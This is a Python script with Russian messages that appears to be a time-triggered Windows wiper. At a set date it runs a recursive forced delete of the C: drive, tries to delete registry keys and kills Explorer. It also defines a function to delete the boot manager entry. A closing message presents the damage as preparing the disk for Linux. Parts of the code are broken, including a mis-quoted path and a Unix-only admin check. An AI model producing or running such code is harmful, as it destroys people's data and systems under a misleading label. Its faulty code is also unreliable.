import os
import subprocess
import sys
import time
import winreg
from datetime import datetime

def run_command(command):
    print(f"Выполнение команды: {command}")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if process.returncode == 0:
        print(stdout.decode('utf-8'))
    else:
        print(f"Ошибка: {stderr.decode('utf-8')}")
        sys.exit(1)

def delete_bcd_entry():
    print("Удаление записи загрузчика Windows (BCD)...")
    run_command("bcdedit /delete {bootmgr}")

def clean_disk():
    run_command("rmdir /s /q C:\"")

def delete_registry_key(hive, subkey):
    try:
        # Open the registry key with write access
        key_handle = winreg.OpenKey(hive, subkey, 0, winreg.KEY_WRITE)
        
        # Delete the key
        winreg.DeleteKey(hive, subkey)
        print(f"Deleted registry key: {subkey}")
        
        # Close the handle to the key
        winreg.CloseKey(key_handle)
    except Exception as e:
        print(f"Error deleting key: {e}")

def delete_windows_registry_keys():
    print("Удаление всех ключей реестра Windows...")

    delete_registry_key(winreg.HKEY_CLASSES_ROOT, r".")

def trigger_bsod():
    print("Вызов синего экрана смерти...")
    run_command("taskkill /f /im explorer.exe")

def wait_until_target_time():
    target_time = "2024-12-31 23:59:59"
    print(f"Ожидаю время {target_time} для выполнения действий...")
    
    while True:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if current_time == target_time:
            print(f"Время наступило! ({current_time})")
            return
        time.sleep(1)

def main():
    wait_until_target_time()
    print("Запуск скрипта для удаления следов Windows...")
    
    clean_disk()
    delete_windows_registry_keys()
    trigger_bsod()

    print("Процесс завершен. Ваш диск подготовлен для установки Linux.")

if __name__ == "__main__":
    if not os.geteuid() == 0:
        print("Этот скрипт нужно запускать с правами администратора!")
        sys.exit(1)

    main()
